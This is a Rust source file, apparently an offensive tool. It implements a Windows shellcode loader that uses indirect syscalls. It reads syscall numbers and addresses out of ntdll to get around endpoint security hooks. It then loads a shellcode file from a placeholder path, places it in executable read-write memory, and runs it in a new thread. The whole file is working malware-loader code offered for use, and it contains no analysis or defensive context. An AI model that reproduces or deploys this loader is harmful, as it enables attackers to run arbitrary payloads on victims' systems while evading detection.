extern crate winapi;

use std::fs::File;
use std::io::{self, Read};
use std::ptr;
use std::ffi::c_void;
use winapi::um::libloaderapi::{GetProcAddress, GetModuleHandleA};
use winapi::shared::ntdef::HANDLE;
use winapi::um::processthreadsapi::GetCurrentProcess;

// External syscall functions from the `.asm` file
extern "C" {
    fn NtAllocateVirtualMemory(
        process_handle: HANDLE,
        base_address: *mut *mut c_void,
        zero_bits: u64,
        region_size: *mut usize,
        allocation_type: u32,
        protect: u32,
    ) -> u32;

    fn NtWriteVirtualMemory(
        process_handle: HANDLE,
        base_address: *mut c_void,
        buffer: *const c_void,
        buffer_size: usize,
        bytes_written: *mut usize,
    ) -> u32;

    fn NtCreateThreadEx(
        thread_handle: *mut HANDLE,
        desired_access: u32,
        object_attributes: *mut c_void,
        process_handle: HANDLE,
        start_address: *const c_void,
        parameter: *mut c_void,
        create_flags: u32,
        stack_zero_bits: usize,
        size_of_stack_commit: usize,
        size_of_stack_reserve: usize,
        bytes_buffer: *mut c_void,
    ) -> u32;

    fn NtWaitForSingleObject(
        handle: HANDLE,
        alertable: u8,
        timeout: *const i64,
    ) -> u32;
}

// Global variables for syscall numbers and addresses
#[no_mangle]
static mut wNtAllocateVirtualMemory: u32 = 0;
#[no_mangle]
static mut sysAddrNtAllocateVirtualMemory: usize = 0;

#[no_mangle]
static mut wNtWriteVirtualMemory: u32 = 0;
#[no_mangle]
static mut sysAddrNtWriteVirtualMemory: usize = 0;

#[no_mangle]
static mut wNtCreateThreadEx: u32 = 0;
#[no_mangle]
static mut sysAddrNtCreateThreadEx: usize = 0;

#[no_mangle]
static mut wNtWaitForSingleObject: u32 = 0;
#[no_mangle]
static mut sysAddrNtWaitForSingleObject: usize = 0;

// Function to populate syscall numbers and addresses
unsafe fn get_syscall_addresses() {
    let h_ntdll = GetModuleHandleA("ntdll.dll\0".as_ptr() as *const i8);
    if h_ntdll.is_null() {
        panic!("[!] Failed to load ntdll.dll");
    }

    let p_nt_allocate_virtual_memory = GetProcAddress(h_ntdll, "NtAllocateVirtualMemory\0".as_ptr() as *const i8);
    if p_nt_allocate_virtual_memory.is_null() {
        panic!("[!] Failed to get NtAllocateVirtualMemory address");
    }
    wNtAllocateVirtualMemory = *(p_nt_allocate_virtual_memory as *const u8).add(4) as u32;
    sysAddrNtAllocateVirtualMemory = p_nt_allocate_virtual_memory as usize + 0x12;

    let p_nt_write_virtual_memory = GetProcAddress(h_ntdll, "NtWriteVirtualMemory\0".as_ptr() as *const i8);
    if p_nt_write_virtual_memory.is_null() {
        panic!("[!] Failed to get NtWriteVirtualMemory address");
    }
    wNtWriteVirtualMemory = *(p_nt_write_virtual_memory as *const u8).add(4) as u32;
    sysAddrNtWriteVirtualMemory = p_nt_write_virtual_memory as usize + 0x12;

    let p_nt_create_thread_ex = GetProcAddress(h_ntdll, "NtCreateThreadEx\0".as_ptr() as *const i8);
    if p_nt_create_thread_ex.is_null() {
        panic!("[!] Failed to get NtCreateThreadEx address");
    }
    wNtCreateThreadEx = *(p_nt_create_thread_ex as *const u8).add(4) as u32;
    sysAddrNtCreateThreadEx = p_nt_create_thread_ex as usize + 0x12;

    let p_nt_wait_for_single_object = GetProcAddress(h_ntdll, "NtWaitForSingleObject\0".as_ptr() as *const i8);
    if p_nt_wait_for_single_object.is_null() {
        panic!("[!] Failed to get NtWaitForSingleObject address");
    }
    wNtWaitForSingleObject = *(p_nt_wait_for_single_object as *const u8).add(4) as u32;
    sysAddrNtWaitForSingleObject = p_nt_wait_for_single_object as usize + 0x12;
}

unsafe fn load_data_from_file(file_path: &str) -> io::Result<Vec<u8>> {
    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    Ok(buffer)
}

fn main() {
    unsafe {
        // Initialize syscall numbers and addresses
        get_syscall_addresses();

        //Load shell from file
        let data = load_data_from_file("C:\\PATH\\TO\\YOUR\\SHELL.BIN").expect("Failed to load Data");

        // Allocate memory for shellcode
        let mut alloc_buffer: *mut c_void = ptr::null_mut();
        let mut region_size: usize = data.len();

        println!("[i] Attempting memory allocation");
        let status = NtAllocateVirtualMemory(
            GetCurrentProcess(),
            &mut alloc_buffer,
            0,
            &mut region_size,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x40,   // PAGE_EXECUTE_READWRITE
        );

        if status != 0 {
            panic!(
                "[!] NtAllocateVirtualMemory failed with status: 0x{:x}",
                status
            );
        }
        println!("[+] Memory allocated at: {:?}", alloc_buffer);

        println!("[i] Writing shellcode to allocated memory");
        let mut bytes_written: usize = 0;
        let status = NtWriteVirtualMemory(
            GetCurrentProcess(),
            alloc_buffer,
            data.as_ptr() as *const _,
            data.len(),
            &mut bytes_written,
        );

        if status != 0 {
            panic!(
                "[!] NtWriteVirtualMemory failed with status: 0x{:x}",
                status
            );
        }
        println!("[+] Shellcode written successfully.");

        // Create a thread to execute the shellcode
        let mut thread_handle: HANDLE = ptr::null_mut();
        println!("[i] Creating a thread to execute the shellcode");
        let status = NtCreateThreadEx(
            &mut thread_handle,
            0x1FFFFF, // THREAD_ALL_ACCESS
            ptr::null_mut(),
            GetCurrentProcess(),
            alloc_buffer,
            ptr::null_mut(),
            0,
            0,
            0,
            0,
            ptr::null_mut(),
        );

        if status != 0 {
            panic!(
                "[!] NtCreateThreadEx failed with status: 0x{:x}",
                status
            );
        }
        println!("[+] Thread created with handle: {:?}", thread_handle);

        // Wait for the thread to complete execution
        println!("[i] Waiting for the thread to finish execution");
        let status = NtWaitForSingleObject(thread_handle, 0, ptr::null());

        if status != 0 {
            panic!(
                "[!] NtWaitForSingleObject failed with status: 0x{:x}",
                status
            );
        }
        println!("[+] Shellcode executed successfully");
    }
}
